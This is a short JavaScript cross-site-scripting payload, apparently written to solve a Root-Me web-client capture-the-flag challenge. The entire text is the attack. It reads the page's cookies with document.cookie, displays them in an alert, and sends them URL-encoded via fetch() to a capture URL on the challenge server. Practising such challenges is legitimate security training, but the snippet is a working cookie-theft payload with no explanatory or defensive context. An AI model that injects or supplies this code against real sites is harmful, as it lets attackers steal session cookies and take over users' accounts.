var cookies = document.cookie;
alert(cookies);
fetch('http://challenge01.root-me.org/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
